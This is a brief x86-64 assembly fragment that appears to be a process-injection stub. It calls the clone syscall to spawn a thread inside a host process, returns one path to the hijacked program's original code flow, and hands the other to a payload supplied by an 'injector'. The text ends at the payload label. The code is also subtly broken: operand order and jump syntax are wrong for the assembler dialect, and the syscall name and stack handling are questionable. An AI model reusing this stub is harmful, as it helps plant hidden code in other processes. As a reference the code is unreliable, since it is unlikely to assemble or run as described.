

.text
_start:


   # save the return address to the stack
   push %r11
   # syscall number for clone2()
   mov %rax, 56

   # clone2(flags, stack_base, stack_size, partent_tid, child_tid, tls)

   # most of these can just be left NULL, all we really care about is the flag
   # CLONE flags:
   # CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SYSVSEM | CLONE_SIGHAND | CLONE_THREAD
   mov %rdi, 331520
   xor %rsi, %rsi
   xor %rdx, %rdx
   xor %r10, %r10
   xor %r8,  %r8
   syscall
   pop %r11

   cmp %rax, 0
   # go the the parent path to run the payload we provided in the injector
   jne parent_path
   # jmp back to to original code flow
   jmp %r11


   parent_path:
